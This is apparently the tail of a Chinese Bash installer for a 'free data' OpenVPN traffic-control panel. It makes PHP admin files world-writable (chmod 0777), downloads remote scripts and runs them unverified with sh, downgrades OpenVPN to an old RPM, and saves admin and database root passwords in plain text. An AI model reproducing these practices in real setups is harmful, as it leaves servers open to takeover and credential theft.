chmod -R 0777 /home/wwwroot/default/app_api/data/default.txt            >/dev/null 2>&1
chmod -R 0777 /home/wwwroot/default/app_api/data/reg_type.txt           >/dev/null 2>&1
chmod -R 0777 /home/wwwroot/default/app_api/data/max_limit.txt          >/dev/null 2>&1
chmod -R 0777 /home/wwwroot/default/app_api/data/daili_100340768.txt    >/dev/null 2>&1
chmod -R 0777 /home/wwwroot/default/app_api/data/daili_2207134109.txt   >/dev/null 2>&1
chmod -R 0777 /home/wwwroot/default/app_api/qq_admin.php                >/dev/null 2>&1
chmod -R 0777 /home/wwwroot/default/app_api/AdminShengji.php            >/dev/null 2>&1
chmod -R 0777 /home/wwwroot/default/app_api/cloudgg.php                 >/dev/null 2>&1
chmod -R 0777 /home/wwwroot/default/app_api/dl.php                      >/dev/null 2>&1
chmod -R 0777 /home/wwwroot/default/app_api/ngg.php                     >/dev/null 2>&1
vpn >/dev/null 2>&1
systemctl enable openvpn@server.service >/dev/null 2>&1
echo
echo -e "\033[35mWeb流量控制程序安装完成...\033[0m"
echo 
echo "制作APP中..."
echo
wget -q ${Download}/appsc.sh;sh appsc.sh
sleep 1
echo "APP制作成功"
echo
echo -e "\033[32m开始生成配置文件...\033[0m"
echo
wget -q ${Download}/xlsc.sh;sh xlsc.sh
onlock >/dev/null 2>&1
source /etc/openvpn/guanli.cfg
\cp -rf /home/${uploadfile} /home/wwwroot/default/${uploadfile} >/dev/null 2>&1
\cp -rf /home/xgg.apk /home/wwwroot/default/xgg.apk >/dev/null 2>&1
\cp -rf /home/llws.apk /home/wwwroot/default/llws.apk >/dev/null 2>&1
LASTLINE=`date +"%Y-%m-%d %H:%M:%S"`    #获取结束时间
cd /home/
rm -rf llws
rm -rf android
rm -rf *.ovpn
rm -rf /home/apktool.jar
rm -rf /home/signer.tar.gz 
Sys_data=`date -d  "$CURTIME" +%s`   #把开始时间转化为Linux时间
In_data=`date -d  "$LASTLINE" +%s`   #把结束时间转化为Linux时间
intstalltime=`expr $In_data - $Sys_data`  #计算2个时间的差
echo "
---------------------------------------------
恭喜，您已经安装完毕。
流量查询 http://${IP}:${port}/cx.php
管理后台 http://${IP}:${port}/${ht}
数据库后台 http://${IP}:${port}/${phpmyadmin}
管理员账号 $id 管理员密码 $ml
数据库账号 root 数据库密码 $sqlpass
---------------------------------------------
云端APP： http://${IP}:${port}/xgg.apk
流量卫士：http://${IP}:${port}/llws.apk
IOS线路安装：http://${IP}:${port}/ios
配置文件：http://${IP}:${port}/${uploadfile}
---------------------------------------------
常用指令：
重启VPN vpn
开端口命令 kdk
数据库开启 onsql
数据库关闭 unsql
目录锁开启 onlock
目录锁关闭 unlock
---------------------------------------------
信息存放于服务器/home/info.txt中
---------------------------------------------
">>info.txt
clear
cd /root
fwqtype=`curl -s  http://ip138.com/ips138.asp?ip=${IP}\&action=2 | iconv -f gb2312 -t utf-8|grep '<ul class="ul1"><li>' |awk -F'[><]+' '{  
print $5}'`
if [[ $fwqtype =~ "阿里云" ]] || [[ $fwqtype =~ "腾讯云" ]] || [[ $fwqtype =~ "小鸟云" ]]; then
echo
else
echo
wget ${Download}/openvpn-2.3.2-4.el7.x86_64.rpm >/dev/null 2>&1
rpm -Uvh --oldpackage openvpn-2.3.2-4.el7.x86_64.rpm >/dev/null 2>&1
rm -rf openvpn-2.3.2-4.el7.x86_64.rpm >/dev/null 2>&1
fi
vpn >/dev/null 2>&1
cat /home/info.txt
echo -e "\033[33m本次安装共花费 $intstalltime 秒\033[0m"
exit 0
fi
#版权所有：小哥哥免流
#小哥哥QQ：843491408
#官方地址：yxvpn.net
#做人不能太飘 勿忘初心
